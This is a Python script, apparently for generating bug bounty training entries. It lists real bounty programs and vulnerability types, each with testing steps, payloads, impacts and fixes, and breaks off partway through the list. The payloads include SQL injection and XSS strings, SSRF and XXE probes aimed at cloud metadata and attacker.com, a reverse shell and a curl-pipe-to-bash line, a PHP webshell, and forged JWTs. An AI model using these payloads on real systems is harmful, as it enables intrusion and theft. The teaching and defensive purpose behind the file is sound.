#!/usr/bin/env python3
"""
Bug Bounty Knowledge Base Generator
Generates 1000+ structured learning entries for bug bounty hunting training.
"""

import json
import random
import os
from datetime import datetime, timedelta

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

PROGRAMS = [
    {"name": "Google VRP", "platform": "Google", "focus": ["Android", "Chrome", "GCP", "G Suite", "YouTube"]},
    {"name": "Meta Bug Bounty", "platform": "Meta", "focus": ["Facebook", "Instagram", "WhatsApp", "Messenger"]},
    {"name": "Microsoft MSRC", "platform": "Microsoft", "focus": ["Azure", "Office 365", "Edge", "LinkedIn", "GitHub"]},
    {"name": "Apple Security Bounty", "platform": "Apple", "focus": ["iOS", "macOS", "Safari", "iCloud"]},
    {"name": "Uber Bug Bounty", "platform": "HackerOne", "focus": ["Rider App", "Driver App", "Web App", "API"]},
    {"name": "Shopify Bug Bounty", "platform": "HackerOne", "focus": ["Admin Panel", "Storefront", "API", "Apps"]},
    {"name": "GitHub Bug Bounty", "platform": "HackerOne", "focus": ["GitHub.com", "GitHub Enterprise", "Actions"]},
    {"name": "GitLab Bug Bounty", "platform": "HackerOne", "focus": ["GitLab.com", "GitLab CE/EE", "Runner"]},
    {"name": "Dropbox Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Desktop Client"]},
    {"name": "Slack Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Desktop App", "Mobile App", "API"]},
    {"name": "Twitter Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API", "Ads"]},
    {"name": "Pinterest Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "LinkedIn Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Amazon AWS Bug Bounty", "platform": "HackerOne", "focus": ["AWS Console", "AWS Services", "Amazon.com"]},
    {"name": "Netflix Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Starbucks Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Snapchat Bug Bounty", "platform": "HackerOne", "focus": ["Snapchat App", "Web App", "API"]},
    {"name": "Yahoo Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "AT&T Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Verizon Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Spotify Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Airbnb Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "PayPal Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Coinbase Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App", "Blockchain"]},
    {"name": "Stripe Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Dashboard"]},
    {"name": "Cloudflare Bug Bounty", "platform": "Bugcrowd", "focus": ["Web App", "API", "Dashboard"]},
    {"name": "DigitalOcean Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Dashboard"]},
    {"name": "Fastly Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "CDN"]},
    {"name": "Heroku Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Dashboard"]},
    {"name": "Vercel Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Dashboard"]},
    {"name": "Netlify Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Dashboard"]},
    {"name": "Twilio Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "SMS", "Voice"]},
    {"name": "SendGrid Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Email"]},
    {"name": "MongoDB Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Atlas", "Compass"]},
    {"name": "Redis Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Redis Cloud"]},
    {"name": "Elastic Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Elastic Cloud", "Kibana"]},
    {"name": "Atlassian Bug Bounty", "platform": "HackerOne", "focus": ["Jira", "Confluence", "Bitbucket", "Trello"]},
    {"name": "Okta Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "SAML", "SSO"]},
    {"name": "Auth0 Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Auth Flows"]},
    {"name": "Zoom Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Desktop App", "Mobile App", "API"]},
    {"name": "Microsoft Teams Bug Bounty", "platform": "Microsoft", "focus": ["Web App", "Desktop App", "Mobile App"]},
    {"name": "Skype Bug Bounty", "platform": "Microsoft", "focus": ["Web App", "Desktop App", "Mobile App"]},
    {"name": "OneDrive Bug Bounty", "platform": "Microsoft", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Azure DevOps Bug Bounty", "platform": "Microsoft", "focus": ["Web App", "API", "Pipelines"]},
    {"name": "Xbox Bug Bounty", "platform": "Microsoft", "focus": ["Web App", "Xbox Live", "API"]},
    {"name": "Fortnite Bug Bounty", "platform": "Bugcrowd", "focus": ["Web App", "API", "Game Services"]},
    {"name": "Epic Games Bug Bounty", "platform": "Bugcrowd", "focus": ["Web App", "API", "Unreal Engine"]},
    {"name": "Ubisoft Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Game Services"]},
    {"name": "EA Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Origin", "Game Services"]},
    {"name": "Blizzard Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Battle.net", "API"]},
    {"name": "Riot Games Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "League of Legends"]},
    {"name": "Nintendo Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Switch Online"]},
    {"name": "PlayStation Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "PSN", "API"]},
    {"name": "Samsung Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Samsung Account", "API"]},
    {"name": "Huawei Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile"]},
    {"name": "Xiaomi Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "MIUI"]},
    {"name": "Tencent Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "WeChat"]},
    {"name": "Alibaba Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Alipay"]},
    {"name": "Baidu Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Baidu Cloud"]},
    {"name": "Flipkart Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Ola Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Zomato Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Swiggy Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Grab Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Gojek Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Sea Limited Bug Bounty", "platform": "HackerOne", "focus": ["Shopee", "Garena", "SeaMoney"]},
    {"name": "TikTok Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Bytedance Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Spotify Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Deezer Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "SoundCloud Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Twitch Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Desktop App", "API"]},
    {"name": "Discord Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Desktop App", "Mobile App", "API"]},
    {"name": "Reddit Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Quora Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "Mobile App", "API"]},
    {"name": "Medium Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "WordPress Bug Bounty", "platform": "HackerOne", "focus": ["WordPress.com", "Jetpack", "VIP"]},
    {"name": "Automattic Bug Bounty", "platform": "HackerOne", "focus": ["WordPress.com", "WooCommerce", "Jetpack"]},
    {"name": "Zendesk Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Freshworks Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API", "Mobile App"]},
    {"name": "Intercom Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Drift Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Segment Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Amplitude Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Mixpanel Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Heap Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Pendo Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Appcues Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Userlane Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "WalkMe Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Gainsight Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "ChurnZero Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
    {"name": "Totango Bug Bounty", "platform": "HackerOne", "focus": ["Web App", "API"]},
]

VULN_TYPES = [
    {
        "name": "SQL Injection",
        "severity_range": ["Critical", "High", "Medium"],
        "bounty_base": {"Critical": 10000, "High": 5000, "Medium": 1500},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Test all user input fields for SQL injection by injecting single quotes and observing error messages",
            "Use UNION-based injection to extract data by determining the number of columns with ORDER BY",
            "Test for blind SQL injection using boolean conditions and time-based techniques",
            "Enumerate database structure using information_schema tables",
            "Extract sensitive data including user credentials and personal information",
            "Attempt to escalate privileges via database-level exploitation",
            "Test for stacked queries to execute multiple SQL statements",
            "Use out-of-band techniques when in-band is not possible"
        ],
        "payloads": [
            "' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--", "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--", "1' AND (SELECT COUNT(*) FROM users)>0--",
            "' UNION SELECT username,password FROM users--", "1' ORDER BY 100--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--"
        ],
        "impacts": [
            "Full database compromise with access to all user data",
            "Extraction of credentials leading to account takeover",
            "Modification or deletion of sensitive records",
            "Potential for RCE via database functions or stacked queries",
            "Lateral movement to other systems via database links"
        ],
        "remediation": [
            "Use parameterized queries or prepared statements for all database interactions",
            "Implement input validation and sanitization using allowlists",
            "Apply principle of least privilege for database accounts",
            "Enable database query logging and monitoring",
            "Use stored procedures where appropriate",
            "Implement WAF rules to detect and block SQL injection attempts"
        ]
    },
    {
        "name": "Cross-Site Scripting (XSS)",
        "severity_range": ["High", "Medium", "Low"],
        "bounty_base": {"High": 3000, "Medium": 1000, "Low": 300},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Test all user input fields for reflection in page source without HTML encoding",
            "Check for Content-Security-Policy headers and their configuration",
            "Identify the HTML context of reflected input (tag, attribute, script, CSS)",
            "Test filter bypasses using case variation, encoding, and alternative tags",
            "Check for DOM-based XSS by analyzing JavaScript sinks and sources",
            "Test SVG and event handler injection vectors",
            "Verify SameSite cookie attributes and session security",
            "Attempt to steal session cookies or perform actions as victim"
        ],
        "payloads": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "<ScRiPt>alert(1)</ScRiPt>",
            "javascript:alert(1)", "#<img src=x onerror=alert(1)>",
            "{{7*7}}", "${7*7}"
        ],
        "impacts": [
            "Session hijacking through cookie theft",
            "Performing actions as the victim user",
            "Redirecting users to phishing pages",
            "Keylogging and form data theft",
            "Cryptocurrency mining in victim's browser"
        ],
        "remediation": [
            "Implement context-aware output encoding (HTML, JavaScript, URL, CSS)",
            "Use Content-Security-Policy headers to restrict script execution",
            "Implement input validation using allowlists",
            "Use HTTPOnly and Secure flags on session cookies",
            "Implement Subresource Integrity (SRI) for external scripts",
            "Use modern frameworks that auto-escape by default"
        ]
    },
    {
        "name": "Server-Side Request Forgery (SSRF)",
        "severity_range": ["Critical", "High", "Medium"],
        "bounty_base": {"Critical": 12000, "High": 6000, "Medium": 2000},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Go", ".NET"],
        "methodologies": [
            "Identify all URL input parameters including those in webhooks, file imports, and URL parameters",
            "Test with internal IP addresses (127.0.0.1, 169.254.169.254) to detect internal network access",
            "Check for cloud metadata endpoints (AWS, GCP, Azure) to access instance credentials",
            "Test protocol handlers (file://, gopher://, dict://) for additional attack vectors",
            "Attempt DNS rebinding to bypass URL validation filters",
            "Use redirect chains to bypass allowlist restrictions",
            "Test for blind SSRF using out-of-band techniques",
            "Map internal network topology through port scanning"
        ],
        "payloads": [
            "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd", "gopher://127.0.0.1:25/",
            "http://0x7f000001/", "http://2130706433/",
            "http://127.0.0.1.nip.io/", "http://metadata.google.internal/"
        ],
        "impacts": [
            "Access to cloud instance credentials and metadata",
            "Internal network scanning and service enumeration",
            "Reading sensitive local files on the server",
            "Interacting with internal APIs and services",
            "Bypassing firewalls to access restricted resources"
        ],
        "remediation": [
            "Validate and sanitize all user-supplied URLs against an allowlist",
            "Block access to private IP ranges and cloud metadata endpoints",
            "Use network segmentation to isolate internal services",
            "Implement DNS resolution validation before making requests",
            "Disable unnecessary URL protocols (file://, gopher://, dict://)",
            "Use a dedicated proxy server for outbound requests"
        ]
    },
    {
        "name": "Insecure Direct Object Reference (IDOR)",
        "severity_range": ["High", "Medium", "Low"],
        "bounty_base": {"High": 3000, "Medium": 1000, "Low": 300},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Map all endpoints that accept object identifiers (IDs, UUIDs, filenames)",
            "Test each endpoint with different user sessions to verify access control",
            "Check for predictable or sequential identifiers that can be enumerated",
            "Test HTTP method manipulation (GET vs POST vs PUT vs DELETE)",
            "Attempt parameter pollution to bypass authorization checks",
            "Check for IDOR in API responses that leak other users' data",
            "Test for horizontal privilege escalation between user accounts",
            "Attempt vertical privilege escalation to access admin resources"
        ],
        "payloads": [
            "id=1", "id=2", "user_id=other_user_id", "doc_id=1",
            "GET /api/user/1 -> POST /api/user/1", "X-User-ID: admin",
            "uuid=550e8400-e29b-41d4-a716-446655440000"
        ],
        "impacts": [
            "Access to other users' private data",
            "Modification of unauthorized records",
            "Privilege escalation through object manipulation",
            "Account takeover via profile modification",
            "Data breach through mass enumeration"
        ],
        "remediation": [
            "Implement proper authorization checks for every object access",
            "Use indirect references (UUIDs, hashes) instead of sequential IDs",
            "Enforce ownership verification at the application layer",
            "Implement rate limiting on object enumeration",
            "Log and monitor unusual access patterns",
            "Use access control lists (ACLs) for fine-grained permissions"
        ]
    },
    {
        "name": "Remote Code Execution (RCE)",
        "severity_range": ["Critical"],
        "bounty_base": {"Critical": 20000},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Identify command injection points in all user input parameters",
            "Test for unsafe deserialization in application code",
            "Check for server-side template injection that can be escalated to RCE",
            "Evaluate file upload functionality for code execution possibilities",
            "Test for eval/exec function parameters that accept user input",
            "Bypass input filters using encoding, variable substitution, and alternative syntax",
            "Establish reverse shell for persistent access",
            "Attempt to escalate privileges on the compromised system"
        ],
        "payloads": [
            "; id", "| id", "`id`", "$(id)",
            "; cat /etc/passwd", "| bash -i >& /dev/tcp/attacker/4444 0>&1",
            "python -c 'import socket,subprocess,os;s=socket.socket()'", 
            "curl http://attacker.com/shell.sh | bash"
        ],
        "impacts": [
            "Complete server compromise with full system access",
            "Data theft from the compromised system",
            "Lateral movement to other systems on the network",
            "Persistent backdoor installation",
            "Ransomware deployment or cryptocurrency mining"
        ],
        "remediation": [
            "Never pass user input to system commands",
            "Use parameterized APIs instead of shell commands",
            "Implement input validation and sanitization",
            "Use sandboxing and containerization for isolation",
            "Apply principle of least privilege for application processes",
            "Monitor for suspicious command execution patterns"
        ]
    },
    {
        "name": "Authentication Bypass",
        "severity_range": ["Critical", "High"],
        "bounty_base": {"Critical": 15000, "High": 7000},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Map all authentication endpoints and alternative login methods",
            "Test for default credentials on admin panels and services",
            "Analyze session management implementation for weaknesses",
            "Test JWT token manipulation including algorithm confusion",
            "Check OAuth flow for redirect_uri manipulation",
            "Attempt parameter pollution to bypass authentication checks",
            "Test for race conditions in authentication processes",
            "Verify password reset flow for account takeover"
        ],
        "payloads": [
            "admin' --", "' OR '1'='1", "{\"alg\":\"none\"}",
            "redirect_uri=http://evil.com", "username=admin&password=admin",
            "X-Original-URL: /admin", "X-Rewrite-URL: /admin"
        ],
        "impacts": [
            "Complete account takeover",
            "Access to admin functionality",
            "Data breach of all user accounts",
            "Unauthorized access to sensitive systems",
            "Privilege escalation to super admin"
        ],
        "remediation": [
            "Implement multi-factor authentication",
            "Use secure session management practices",
            "Validate JWT tokens properly including algorithm verification",
            "Implement rate limiting on authentication attempts",
            "Use secure password storage (bcrypt, Argon2)",
            "Monitor for suspicious authentication patterns"
        ]
    },
    {
        "name": "Privilege Escalation",
        "severity_range": ["Critical", "High"],
        "bounty_base": {"Critical": 10000, "High": 5000},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Enumerate all user roles and their associated permissions",
            "Test parameter manipulation for role changes in API calls",
            "Check for missing function-level authorization controls",
            "Exploit insecure direct object references for privilege escalation",
            "Test for horizontal privilege escalation between user accounts",
            "Attempt vertical escalation from regular user to admin",
            "Check for exposed admin functionality in non-admin interfaces",
            "Chain with other vulnerabilities for maximum impact"
        ],
        "payloads": [
            "role=admin", "is_admin=true", "privilege=high",
            "&role=1", "&admin=1", "X-Admin: true",
            "user_type=administrator", "access_level=10"
        ],
        "impacts": [
            "Access to admin functionality and sensitive data",
            "Ability to modify system configurations",
            "User management and account takeover",
            "Access to financial data and transactions",
            "Complete system compromise"
        ],
        "remediation": [
            "Implement role-based access control (RBAC) with proper validation",
            "Enforce authorization checks at the application layer",
            "Use principle of least privilege for all user roles",
            "Implement audit logging for privilege changes",
            "Regularly review and update access control policies",
            "Test authorization controls during security reviews"
        ]
    },
    {
        "name": "XML External Entity (XXE)",
        "severity_range": ["Critical", "High", "Medium"],
        "bounty_base": {"Critical": 8000, "High": 4000, "Medium": 1500},
        "technologies": ["Java", ".NET", "PHP", "Python"],
        "methodologies": [
            "Identify all XML processing endpoints including file uploads and API endpoints",
            "Test with basic XXE payloads to read local files (/etc/passwd)",
            "Check for blind XXE using out-of-band techniques",
            "Test for SSRF via XXE to access cloud metadata endpoints",
            "Verify XML parser configurations and DTD processing settings",
            "Test SVG file upload for XXE exploitation",
            "Check SOAP API endpoints for XXE vulnerabilities",
            "Attempt DDoS via billion laughs attack if DoS is in scope"
        ],
        "payloads": [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><foo>&xxe;</foo>",
            "<svg xmlns='http://www.w3.org/2000/svg'><text>&xxe;</text></svg>",
            "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM 'http://attacker.com/ext.dtd'>%xxe;]>"
        ],
        "impacts": [
            "Reading sensitive local files from the server",
            "SSRF to internal services and cloud metadata",
            "Exfiltration of data via out-of-band channels",
            "Denial of service via billion laughs attack",
            "Remote code execution in specific configurations"
        ],
        "remediation": [
            "Disable DTD processing in XML parsers",
            "Use JSON instead of XML where possible",
            "Implement input validation for XML content",
            "Use less complex data formats (JSON, YAML)",
            "Apply firewall rules to prevent outbound connections",
            "Regularly update XML parsing libraries"
        ]
    },
    {
        "name": "Cross-Site Request Forgery (CSRF)",
        "severity_range": ["High", "Medium", "Low"],
        "bounty_base": {"High": 2000, "Medium": 700, "Low": 200},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Identify all state-changing operations that require user authorization",
            "Test for anti-CSRF token presence and validation",
            "Check SameSite cookie attribute configuration",
            "Verify Origin and Referer header validation",
            "Test for CSRF token predictability or weakness",
            "Craft PoC pages that demonstrate CSRF exploitation",
            "Test for CSRF on critical actions (password change, fund transfer)",
            "Check for subdomain XSS that could be used for token theft"
        ],
        "payloads": [
            "<form action='http://target.com/api/change-email' method='POST'><input name='email' value='attacker@evil.com'><input type='submit'></form>",
            "fetch('http://target.com/api/transfer',{method:'POST',credentials:'include',body:'to=attacker&amount=1000'})",
            "<img src='http://target.com/api/delete-account'>",
            "$.ajax({url:'http://target.com/api/change-email',type:'POST',data:{email:'attacker@evil.com'},xhrFields:{withCredentials:true}})"
        ],
        "impacts": [
            "Unauthorized actions performed as victim user",
            "Financial fraud through unauthorized transfers",
            "Account takeover via email/password changes",
            "Data deletion or modification",
            "Privilege escalation through role changes"
        ],
        "remediation": [
            "Implement anti-CSRF tokens in all state-changing operations",
            "Use SameSite cookie attribute (Strict or Lax)",
            "Validate Origin and Referer headers",
            "Require re-authentication for sensitive operations",
            "Implement proper CORS policies",
            "Use custom headers for AJAX requests"
        ]
    },
    {
        "name": "File Upload",
        "severity_range": ["Critical", "High", "Medium"],
        "bounty_base": {"Critical": 10000, "High": 4000, "Medium": 1500},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Test file type validation by uploading files with various extensions",
            "Bypass extension filters using double extensions and null bytes",
            "Modify Content-Type headers to bypass MIME type validation",
            "Check for web-accessible upload directories",
            "Test for code execution in uploaded files",
            "Attempt to upload webshells for remote code execution",
            "Bypass WAF/AV detection with encoding and obfuscation",
            "Establish persistent access through uploaded backdoors"
        ],
        "payloads": [
            "shell.php", "shell.php.jpg", "shell.php%00.jpg",
            "shell.phtml", "GIF89a<?php system($_GET['cmd']); ?>",
            "Content-Type: image/jpeg", "shell.php::$DATA"
        ],
        "impacts": [
            "Remote code execution on the server",
            "Full server compromise",
            "Data theft from the filesystem",
            "Lateral movement to other systems",
            "Persistent backdoor installation"
        ],
        "remediation": [
            "Validate file types using magic bytes, not just extensions",
            "Store uploads outside the web root",
            "Rename uploaded files to prevent execution",
            "Implement file size limits",
            "Scan uploads with antivirus/anti-malware",
            "Use separate domain or CDN for user-uploaded content"
        ]
    },
    {
        "name": "Subdomain Takeover",
        "severity_range": ["High", "Medium"],
        "bounty_base": {"High": 3000, "Medium": 1000},
        "technologies": ["DNS", "Cloud", "Various"],
        "methodologies": [
            "Enumerate subdomains using passive reconnaissance tools",
            "Check certificate transparency logs for additional subdomains",
            "Analyze DNS records for dangling CNAME entries",
            "Verify service claim status on third-party platforms",
            "Test for unclaimed GitHub Pages, Heroku, S3 buckets",
            "Check for expired or unclaimed cloud service deployments",
            "Document proof of takeover with minimal impact demonstration",
            "Provide remediation advice to the program"
        ],
        "payloads": [
            "CNAME check: dig +short subdomain.target.com",
            "GitHub Pages claim via repository creation",
            "Heroku app creation for unclaimed subdomain",
            "S3 bucket claim via AWS console",
            "Netlify site deployment for unclaimed domain"
        ],
        "impacts": [
            "Phishing via controlled subdomain",
            "Cookie theft through XSS on subdomain",
            "Brand impersonation and reputation damage",
            "Session hijacking if cookies are scoped to parent domain",
            "Malware distribution via trusted domain"
        ],
        "remediation": [
            "Regularly audit DNS records for dangling entries",
            "Remove subdomain DNS records when services are decommissioned",
            "Use CAA records to restrict certificate issuance",
            "Monitor certificate transparency logs for unauthorized certificates",
            "Implement subdomain inventory management",
            "Use DNSSEC for additional security"
        ]
    },
    {
        "name": "Open Redirect",
        "severity_range": ["Medium", "Low"],
        "bounty_base": {"Medium": 500, "Low": 200},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Identify all redirect parameters in URLs and forms",
            "Test redirect parameters with external URLs",
            "Check for filter bypasses using encoding and parser discrepancies",
            "Verify redirect chain behavior and intermediate pages",
            "Test protocol-relative URLs and alternative URL formats",
            "Check if open redirect can be used in OAuth flows",
            "Test for parameter pollution to bypass restrictions",
            "Document impact on phishing and credential theft scenarios"
        ],
        "payloads": [
            "http://evil.com", "//evil.com", "/\\evil.com",
            "http://legitimate.com@evil.com", "http://evil.com%00.legitimate.com",
            "%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"
        ],
        "impacts": [
            "Phishing attacks using trusted domain",
            "OAuth token theft via redirect manipulation",
            "Credential theft through malicious redirects",
            "Bypassing security tools and WAFs",
            "Malware distribution via trusted domain"
        ],
        "remediation": [
            "Validate redirect URLs against an allowlist",
            "Avoid using user-controlled URLs in redirects",
            "Implement proper URL validation with URL parsing",
            "Use direct navigation instead of redirects where possible",
            "Warn users before redirecting to external domains",
            "Implement Content-Security-Policy headers"
        ]
    },
    {
        "name": "Business Logic",
        "severity_range": ["Critical", "High", "Medium", "Low"],
        "bounty_base": {"Critical": 10000, "High": 5000, "Medium": 1500, "Low": 300},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Map all business processes and workflows",
            "Identify price manipulation opportunities in checkout flows",
            "Test for race conditions in concurrent operations",
            "Check for coupon/discount abuse possibilities",
            "Verify step ordering and state machine transitions",
            "Test quantity limits and negative value handling",
            "Check for timing-based vulnerabilities",
            "Document business impact of each finding"
        ],
        "payloads": [
            "price=-1", "discount=100", "quantity=0",
            "coupon=USED_COUPON", "race_condition_concurrent_requests",
            "negative_quantity", "step_skip", "state_manipulation"
        ],
        "impacts": [
            "Financial fraud and revenue loss",
            "Unauthorized access to premium features",
            "Abuse of promotional offers",
            "Data manipulation affecting business operations",
            "Reputational damage from exploited vulnerabilities"
        ],
        "remediation": [
            "Implement server-side validation for all business logic",
            "Use idempotency keys for critical operations",
            "Implement proper state machine validation",
            "Apply rate limiting on business operations",
            "Monitor for unusual patterns in business transactions",
            "Conduct regular security code reviews"
        ]
    },
    {
        "name": "JWT Vulnerabilities",
        "severity_range": ["Critical", "High"],
        "bounty_base": {"Critical": 8000, "High": 4000},
        "technologies": ["Node.js", "Java", "Python", "Go", ".NET"],
        "methodologies": [
            "Decode JWT tokens to analyze structure and claims",
            "Test for none algorithm acceptance",
            "Check for algorithm confusion (RS256 to HS256)",
            "Attempt to brute-force weak signing keys",
            "Test token manipulation and forgery",
            "Verify token expiration and refresh mechanisms",
            "Check for insecure token storage on client-side",
            "Test for JWT injection in authorization headers"
        ],
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "HS256 with public key as secret",
            "{\"alg\":\"none\",\"typ\":\"JWT\"}",
            "Modify claims: {\"user\":\"admin\",\"role\":\"admin\"}"
        ],
        "impacts": [
            "Complete authentication bypass",
            "Account takeover through token forgery",
            "Privilege escalation via claim manipulation",
            "Access to protected resources",
            "Session hijacking"
        ],
        "remediation": [
            "Always validate JWT algorithm on the server",
            "Use strong signing keys (minimum 256 bits)",
            "Implement proper token expiration and rotation",
            "Store tokens securely (httpOnly cookies)",
            "Validate all claims including issuer and audience",
            "Use asymmetric signing algorithms (RS256, ES256)"
        ]
    },
    {
        "name": "GraphQL",
        "severity_range": ["High", "Medium", "Low"],
        "bounty_base": {"High": 3000, "Medium": 1000, "Low": 300},
        "technologies": ["Node.js", "Python", "Java", "Go", "Ruby"],
        "methodologies": [
            "Enable introspection to map the complete schema",
            "Identify queries and mutations with authorization issues",
            "Test for batch query abuse for denial of service",
            "Check for excessive data exposure in responses",
            "Test for injection in GraphQL query parameters",
            "Verify rate limiting and query depth restrictions",
            "Check for missing function-level authorization",
            "Test for GraphQL-specific SSRF and XXE vulnerabilities"
        ],
        "payloads": [
            "{__schema{types{name,fields{name}}}}",
            "{users{id,email,name,role}}",
            "mutation{updateUser(id:1,role:ADMIN){id,role}}",
            "[{\"query\":\"query{users{id,email}}\"},{\"query\":\"query{posts{id,title}}\"}]"
        ],
        "impacts": [
            "Unauthorized data access through exposed queries",
            "Privilege escalation via mutation abuse",
            "Denial of service through query complexity",
            "Information disclosure via introspection",
            "Injection attacks through query parameters"
        ],
        "remediation": [
            "Disable introspection in production environments",
            "Implement query complexity limits and depth restrictions",
            "Apply authorization checks on all resolvers",
            "Implement rate limiting per user/IP",
            "Validate and sanitize all query inputs",
            "Use persisted queries to limit query surface"
        ]
    },
    {
        "name": "Race Condition",
        "severity_range": ["High", "Medium"],
        "bounty_base": {"High": 3000, "Medium": 1000},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Identify time-sensitive operations that modify shared state",
